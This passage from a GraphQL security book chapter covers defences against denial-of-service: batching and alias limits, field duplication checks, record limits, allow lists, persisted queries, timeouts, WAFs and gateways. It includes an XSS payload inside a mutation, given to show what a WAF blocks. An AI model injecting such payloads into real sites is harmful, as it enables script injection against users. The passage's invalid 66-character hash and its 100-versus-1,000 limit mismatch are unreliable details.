<h3 id="h2-502840c05-0018"><a class="XrefDestination" id="AliasandArray-BasedBatchingLimits"/><span class="XrefDestination" id="xref-502840c05-038"/>Alias and Array-Based Batching Limits</h3>
<p class="BodyFirst">Because GraphQL aliases are part of the GraphQL specification, developers can’t disable them easily. Preventing aliases from being abused requires custom middleware code that parses the incoming query, counts the number of specified aliases, and rejects the request if the number appears high enough that it could be dangerous to process. For this type of control to even exist in a GraphQL application, its developers need to be aware of the security weaknesses caused by aliases in the first place.</p>
<p>Unlike aliases, array-based batching is not part of the specification document. It often requires installing additional packages or enabling the feature in the code. Let’s take a look at what disabling array-based batching looks like in Graphene:</p>
<pre><code>app.add_url_rule('/graphql', view_func=GraphQLView.as_view(
  'graphql',
  schema=schema,
<var>  --snip--</var>
  <b>batch=True</b>
))</code></pre>
<p>The <code>batch</code> argument accepts a Boolean value of either <code>True</code> or <code>False</code>. If we toggle it to <code>False</code>, Graphene will reject any arrays from being processed. This is an example of how the GraphQL server implementation natively supports disabling batching and doesn’t require custom code.</p>
<p>In penetration tests, use GraphQL fingerprinting tools such as Graphw00f to identify the target server implementation. You can then use the GraphQL Threat Matrix project we’ve put together (<a class="LinkURL" href="https://github.com/nicholasaleks/graphql-threat-matrix">https://github.com/nicholasaleks/graphql-threat-matrix</a>) to identify whether features such as array-based batching are available. If they exist, figure out whether they can be disabled. These insights will be useful to document in a penetration test report as part of the remediation section.</p>
<h3 id="h2-502840c05-0019"><a class="XrefDestination" id="FieldDuplicationLimits"/><span class="XrefDestination" id="xref-502840c05-039"/>Field Duplication Limits</h3>
<p class="BodyFirst">By default, GraphQL resolves any field specified in a query, even if it’s specified more than once. Even so, we can mitigate against field duplication attacks in multiple ways.</p>
<p>While it doesn’t directly address the field duplication problem, query cost analysis protects GraphQL applications whenever a large number of fields are specified in a single query (whether they are duplicated or not). Cost analysis is an effective mitigation against any form of attack that involves specifying many fields in a single query.</p>
<p>Another form of protection is using a middleware security analyzer to inspect the incoming query and take action if any fields are repeated more than once. The application might choose to implement multiple actions, <span epub:type="pagebreak" id="Page_133" title="133"/>such as completely rejecting a query or <em>normalizing</em> the query by consolidating any repeated fields to eliminate the duplications. This would essentially reconstruct the original query as a safer version. Currently, no feature in GraphQL does this. Application developers will need to develop middleware themselves or use a third-party security tool to do it for them.</p>
<p>Another way applications might go about defending themselves against field duplication is by calculating the query’s field “height.” Consider the query in <a href="#figure5-7" id="figureanchor5-7">Figure 5-7</a>.</p>
<figure>
<img alt="" class="keyline" src="image_fi/502840c05/f05007.png"/>
<figcaption><p><a id="figure5-7">Figure 5-7</a>: An example GraphQL query height</p></figcaption>
</figure>
<p>This query requests the <code>owner</code> field, and then the <code>owner</code> field’s <code>id</code> (once) and <code>name</code> (four times). As you can see, the height altogether is 5. An application might limit any query that exceeds a certain allowed height. Keep in mind that, by default, GraphQL does not implement this type of control.</p>
<h3 id="h2-502840c05-0020"><a class="XrefDestination" id="LimitsontheNumberofReturnedRecords"/><span class="XrefDestination" id="xref-502840c05-040"/>Limits on the Number of Returned Records</h3>
<p class="BodyFirst">GraphQL servers could limit the number of objects they return when a client requests an array field. To do so, they could set a maximum number of items to return on the server side and keep the client from overriding it. Here is an example of how this can be achieved in Graphene:</p>
<pre><code>def resolve_pastes(self, info, public=False):
    query = PasteObject.get_query(info)
    return query.filter_by(public=public, burn=False).order_by(Paste.id.desc())<b>.limit(100)</b></code></pre>
<p>This example resolver function is for the <code>pastes</code> query. The limit ensures that no matter how many pastes exist in the database, the maximum number of pastes returned is 1,000.</p>
<p>Another way to limit the number of records returned in a response is by introducing API pagination, which controls the number of records a client can retrieve in a single request.</p>
<h3 id="h2-502840c05-0021"><a class="XrefDestination" id="QueryAllowLists"/><span class="XrefDestination" id="xref-502840c05-041"/>Query Allow Lists</h3>
<p class="BodyFirst">Another defense technique an application might implement is an allow-list approach. The concept of <em>allow lists</em> is simple: you define the GraphQL <span epub:type="pagebreak" id="Page_134" title="134"/>queries that an application can accept, and you reject any queries that aren’t on the list. You can consider this to be a safe list of trusted queries.</p>
<p>The allow-list approach is typically safer than the use of a deny list, which tends to be prone to more errors. A malicious payload can be constructed in a variety of ways, and if you don’t take all of those variations into consideration when building a deny list, attackers might find ways to bypass it.</p>
<p>Query allow lists do not normally exist in GraphQL server implementations, nor do many external libraries implement them. To leverage such a feature, GraphQL application developers must seek a compatible library for their implementation or create one from scratch.</p>
<h3 id="h2-502840c05-0022"><a class="XrefDestination" id="AutomaticPersistedQueries"/><span class="XrefDestination" id="xref-502840c05-042"/>Automatic Persisted Queries</h3>
<p class="BodyFirst">Query allow lists are often used in conjunction with a caching mechanism called <em>automatic persisted queries</em> <em>(APQ</em>), which is used for improving the performance of GraphQL queries. Instead of using the normal GraphQL query structure, a GraphQL server that implements APQ can accept hashes that represent these queries.</p>
<p>In an APQ interaction between a GraphQL client and server, the client first attempts to send a hash of a query (such as a SHA-256 hash). The server performs a hash lookup in its cache. If the hash doesn’t exist, the server returns an error. The client can then follow up with another request containing the raw GraphQL query, along with its hash, which will get stored in the server’s database. The client can use this hash on any subsequent requests instead of providing the full query. The hash might look like this:</p>
<pre><code>{
   "persisted_query": {
      "sha256Hash": "5e734424cfdde58851234791dea3811caf8e8b389cc3aw7035044ce91679757bc8"
   }
 }</code></pre>
<p>To generate a SHA-256 hash of any query, you can use the <code>sha256sum</code> command, like so:</p>
<pre><code># <b>echo -n "{query{pastes{owner{id}}}}" | sha256sum</b>

5e734424cfdde58851234791dea3811caf8e8b389cc3aw7035044ce91679757bc8</code></pre>
<p>The advantage here is that hashing algorithms produce fixed-length values (for example, SHA-256 hashes are 64 characters in length), no matter how large a query might be. This eliminates the need for clients to send HTTP requests containing large queries over the network and reduces the overall bandwidth consumption. <a href="#figure5-8" id="figureanchor5-8">Figure 5-8</a> illustrates what a GraphQL deployment with APQ might look like.</p>
<span epub:type="pagebreak" id="Page_135" title="135"/><figure>
<img alt="" class="" src="image_fi/502840c05/f05008.png"/>
<figcaption><p><a id="figure5-8">Figure 5-8</a>: The APQ architecture</p></figcaption>
</figure>
<p>You might have noticed a weakness. What if the client is an attacker and forces the server to cache a malicious query? Will the attacker be able to use it in subsequent queries? That is a great question to ask, and also why a mechanism like APQ should coexist with a function such as an allow list. The server should reject malicious queries before they get cached so that only trusted queries can be inserted into the cache.</p>
<p>APQ is designed as a caching mechanism first, but it can also play as a security control to protect GraphQL servers from accepting malicious queries. APQ isn’t yet widely used but is supported in some of the mature GraphQL implementations on the market, such as Apollo GraphQL. You can refer to the GraphQL Threat Matrix project to find out which implementations support APQ.</p>
<h3 id="h2-502840c05-0023"><a class="XrefDestination" id="Timeouts"/><span class="XrefDestination" id="xref-502840c05-043"/>Timeouts</h3>
<p class="BodyFirst"><em>Timeouts</em> are another form of protection against long-running and resource-consuming tasks. When a GraphQL server is bombarded with many queries, it may take minutes to completely fulfill the request. To mitigate these cases, servers can introduce application timeouts, which define how long a request can take to complete.</p>
<p>Some GraphQL implementations, such as graphql-ruby, allow setting a timeout on the query execution in the following way:</p>
<pre><code>class MySchema &lt; GraphQL::Schema
  use GraphQL::Schema::<b>Timeout, max_seconds: 20</b>
end</code></pre>
<p>However, not all GraphQL implementations support setting query timeouts this way. Those GraphQL applications could use timeouts at the web server layer, such as in Nginx or Apache, which support setting timeouts.</p>
<p>Setting the right application timeout intervals tends to be a tricky task; a too-short timeout configuration could mean dropping legitimate client requests and impacting the client’s user experience, which is why applications usually have a high timeout value set by default. Both Nginx and Apache set their request timeout value at around the 60-second range.</p>
<p><span epub:type="pagebreak" id="Page_136" title="136"/>Timeouts can be effective, but they shouldn’t be the only mitigation strategy a GraphQL application implements.</p>
<h3 id="h2-502840c05-0024"><a class="XrefDestination" id="WebApplicationFirewalls"/><span class="XrefDestination" id="xref-502840c05-044"/>Web Application Firewalls</h3>
<p class="BodyFirst"><em>Web application firewalls (WAFs)</em> are useful for blocking malicious traffic before it reaches the application. They allow security teams to respond quickly to attacks and vulnerabilities by creating signatures and rules that block traffic based on various patterns, such as HTTP payloads, URLs, or a client’s geographical location.</p>
<p>WAFs have been battle tested in production environments for many years, protecting web applications and APIs such as REST and SOAP across many industries. However, commercial and open source WAFs are still adapting to the way GraphQL works, and the ways attackers might abuse GraphQL for nefarious purposes, so some gaps remain in the protections WAFs can offer GraphQL applications.</p>
<p>Although some WAFs are not “GraphQL-aware,” the way they inspect traffic still allows them to detect many malicious payloads. They can block suspicious payloads, such as SQL injections, operating system injections, cross-site scripting (XSS), and so on, even when embedded within GraphQL queries or mutations.</p>
<p>Consider the following XSS example in a GraphQL query:</p>
<pre><code>mutation {
  changeName(name:"&lt;script&gt;alert(1)&lt;/script&gt;") {
      name
  }
}</code></pre>
<p>Even WAFs without native GraphQL support will likely identify and reject requests containing such common exploit payloads. Additionally, WAFs can provide other forms of protection, such as body size restrictions (in the form of byte limits) to prevent DoS attacks, or throttling to slow DoS attempts.</p>
<p>However, WAFs without GraphQL support will struggle to defend against many of the attacks you learned about in this chapter. For instance, WAFs typically don’t block single HTTP requests if they don’t contain any malicious patterns, such as dangerous JavaScript payloads (like XSS), or SQL commands (in the case of SQL injection). Although we can send thousands of queries in a single HTTP request by using aliases or array-based batching, WAFs without native GraphQL support won’t understand the danger in accepting such requests.</p>
<h3 id="h2-502840c05-0025"><a class="XrefDestination" id="GatewayProxies"/><span class="XrefDestination" id="xref-502840c05-045"/>Gateway Proxies</h3>
<p class="BodyFirst">GraphQL <em>gateways</em> merge multiple GraphQL schemas into one unified schema, either by stitching them together or by connecting to each individual GraphQL service to fetch its schema content. This schema is then exposed at the gateway layer for clients to consume. <a href="#figure5-9" id="figureanchor5-9">Figure 5-9</a> shows how such an application deployment model might look.</p>
<span epub:type="pagebreak" id="Page_137" title="137"/><figure>
<img alt="" class="" src="image_fi/502840c05/f05009.png"/>
<figcaption><p><a id="figure5-9">Figure 5-9</a>: A GraphQL gateway proxying traffic to other services</p></figcaption>
</figure>
<p>GraphQL gateways are becoming more popular in the security space as a network choke point that can enforce policies and perform rate limiting. They often act as reverse proxies, forwarding traffic to other internal API servers, and can manage multiple API schemas. Gateways also provide features such as auditability, schema version control, authorization controls, Layer 7 DoS protection, and more.</p>
<h2 id="h1-502840c05-0010"><a class="XrefDestination" id="Summary"/><span class="XrefDestination" id="xref-502840c05-046"/>Summary</h2>
<p class="BodyFirst">In this chapter, we discussed several ways an attacker might introduce load on GraphQL servers for the purpose of carrying out DoS attacks. We used several dedicated GraphQL security tools to test for DoS conditions and dissected custom exploits to understand how they work under the hood. You also learned how query batching works in GraphQL and how to make DoS attacks even more powerful by using arrays and aliases. Finally, we explored the types of security defenses GraphQL applications could implement to protect themselves against DoS attacks.</p>
</section>
</body>
</html>